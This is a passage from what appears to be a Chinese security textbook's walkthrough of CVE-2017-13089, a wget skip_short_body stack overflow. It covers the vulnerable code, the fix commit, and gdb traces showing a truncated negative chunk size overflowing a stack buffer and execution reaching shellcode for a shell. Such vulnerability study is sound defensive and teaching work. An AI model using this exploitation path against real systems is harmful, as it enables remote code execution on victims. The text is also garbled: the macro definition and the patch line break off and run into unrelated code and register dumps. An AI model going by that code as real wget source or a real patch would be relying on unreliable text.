码 chunked_transfer_encoding 。对于参数 chunked_transfer_encoding
的设置在函数 gethttp() 中：
// src/http.c
chunked_transfer_encoding = false;
if (resp_header_copy (resp, "Transfer-Encoding", hdrval, sizeof
(hdrval))
&& 0 == c_strcasecmp (hdrval, "chunked"))
chunked_transfer_encoding = true;
而 contlen 的赋值为 contlen = MIN (remaining_chunk_size,
SKIP_SIZE); ， MIN() 宏函数定义如下，用于获得两个值中小的那一个：
// src/wget.h
# define MIN(i, j) ((i) imp->reader)
return info->imp->reader (fd, buf, bufsize, info->ctx);
else
return sock_read (fd, buf, bufsize);
}
补丁
1557
7.1.4 CVE-2017-13089 wget skip_short_body 栈溢出漏洞
$ git show d892291fb8ace4c3b734ea5125770989c215df3f | cat
commit d892291fb8ace4c3b734ea5125770989c215df3f
Author: Tim Rühsen 
Date: Fri Oct 20 10:59:38 2017 +0200
Fix stack overflow in HTTP protocol handling (CVE-2017-13089
)
* src/http.c (skip_short_body): Return error on negative chu
nk size
Reported-by: Antti Levomäki, Christian Jalio, Joonas Pihlaja
from Forcepoint
Reported-by: Juhani Eronen from Finnish National Cyber Secur
ity Centre
diff --git a/src/http.c b/src/http.c
index 5536768..dc31823 100644
--- a/src/http.c
+++ b/src/http.c
@@ -973,6 +973,9 @@ skip_short_body (int fd, wgint contlen, bool
chunked)
remaining_chunk_size = strtol (line, &endl, 16);
xfree (line);
+ if (remaining_chunk_size  0x206f4e0050545448 ('HTTP')
RCX: 0xffffffda
RDX: 0x1
RSI: 0xfffffd00
RDI: 0x6aafab --> 0xfae98148c931000a
RBP: 0x7fffffffd170 --> 0x7fffffffd580 --> 0x7fffffffd8a0 --> 0x
7fffffffd9c0 --> 0x7fffffffdbd0 --> 0x452350 (:
push r15)
RSP: 0x7fffffffcf20 --> 0xffffffffffffffff
RIP: 0x41ef0f (: mov QWORD PTR [rbp-0
x8],rax)
R8 : 0x0
R9 : 0xfffffffffffffff
R10: 0x0
R11: 0x7ffff74045e0 --> 0x2000200020002
R12: 0x404ca0 (: xor ebp,ebp)
R13: 0x7fffffffdcb0 --> 0x2
R14: 0x0
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x41ef04 : mov rsi,rcx
0x41ef07 : mov rdi,rax
0x41ef0a : call 0x404660 
=> 0x41ef0f : mov QWORD PTR [rbp-0x8]
,rax
0x41ef13 : mov rax,QWORD PTR [rbp-
0x10]
0x41ef17 : mov rdi,rax
0x41ef1a : call 0x404380 
0x41ef1f : mov QWORD PTR [rbp-0x10
],0x0
[------------------------------------stack----------------------
---------------]
0000| 0x7fffffffcf20 --> 0xffffffffffffffff
1562
7.1.4 CVE-2017-13089 wget skip_short_body 栈溢出漏洞
0008| 0x7fffffffcf28 --> 0x4ffffcf01
0016| 0x7fffffffcf30 --> 0x13
0024| 0x7fffffffcf38 --> 0x6aafab --> 0xfae98148c931000a
0032| 0x7fffffffcf40 --> 0xffffffff00000028
0040| 0x7fffffffcf48 --> 0x7ffff7652540 --> 0xfbad2887
0048| 0x7fffffffcf50 --> 0x7fffffffcfc0 ("401 Not Authorized\n")
0056| 0x7fffffffcf58 --> 0x13
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x000000000041ef0f in skip_short_body ()
继续调试，到达函数 fd_read() ，可以看到由于强制类型转换的原因其参数只取
出了 0xffffffff00000300 的低 4 个字节 0x300 ，所以该函数将读入 0x300
个字节的数据到栈地址 0x7fffffffcf40 中：
gdb-peda$ n
[----------------------------------registers--------------------
---------------]
RAX: 0x4
RBX: 0x468722 --> 0x206f4e0050545448 ('HTTP')
RCX: 0x7fffffffcf40 --> 0xffffffff00000028
RDX: 0x300
RSI: 0x7fffffffcf40 --> 0xffffffff00000028
RDI: 0x4
RBP: 0x7fffffffd170 --> 0x7fffffffd580 --> 0x7fffffffd8a0 --> 0x
7fffffffd9c0 --> 0x7fffffffdbd0 --> 0x452350 (:
push r15)
RSP: 0x7fffffffcf20 --> 0xffffffff00000300
RIP: 0x41efd6 (: call 0x4062c5 )
R8 : 0x0
R9 : 0x1
R10: 0x0
R11: 0x7ffff74045e0 --> 0x2000200020002
R12: 0x404ca0 (: xor ebp,ebp)
R13: 0x7fffffffdcb0 --> 0x2
R14: 0x0
R15: 0x0
1563
7.1.4 CVE-2017-13089 wget skip_short_body 栈溢出漏洞
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT dire
ction overflow)
[-------------------------------------code----------------------
---------------]
0x41efc9 : movsd xmm0,QWORD PTR [rip
+0x4aa6f] # 0x469a40
0x41efd1 : mov rsi,rcx
0x41efd4 : mov edi,eax
=> 0x41efd6 : call 0x4062c5 
0x41efdb : mov DWORD PTR [rbp-0x14
],eax
0x41efde : cmp DWORD PTR [rbp-0x14
],0x0
0x41efe2 : jg 0x41f029 
0x41efe4 : movzx eax,BYTE PTR [rip+0
x269bf0] # 0x688bdb 
Guessed arguments:
arg[0]: 0x4
arg[1]: 0x7fffffffcf40 --> 0xffffffff00000028
arg[2]: 0x300
arg[3]: 0x7fffffffcf40 --> 0xffffffff00000028
[------------------------------------stack----------------------
---------------]
0000| 0x7fffffffcf20 --> 0xffffffff00000300
0008| 0x7fffffffcf28 --> 0x4ffffcf01
0016| 0x7fffffffcf30 --> 0x13
0024| 0x7fffffffcf38 --> 0x6aafab --> 0xfae98100007ffff7
0032| 0x7fffffffcf40 --> 0xffffffff00000028
0040| 0x7fffffffcf48 --> 0x7ffff7652540 --> 0xfbad2887
0048| 0x7fffffffcf50 --> 0x7fffffffcfc0 ("401 Not Authorized\n")
0056| 0x7fffffffcf58 --> 0x13
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
0x000000000041efd6 in skip_short_body ()
成功跳转到 shellcode，获得 shell：
1564
7.1.4 CVE-2017-13089 wget skip_short_body 栈溢出漏洞
gdb-peda$ n
[----------------------------------registers--------------------
---------------]
RAX: 0x0
RBX: 0x468722 --> 0x206f4e0050545448 ('HTTP')
RCX: 0x7ffff7384260 (: cmp rax,0xffffff
fffffff001)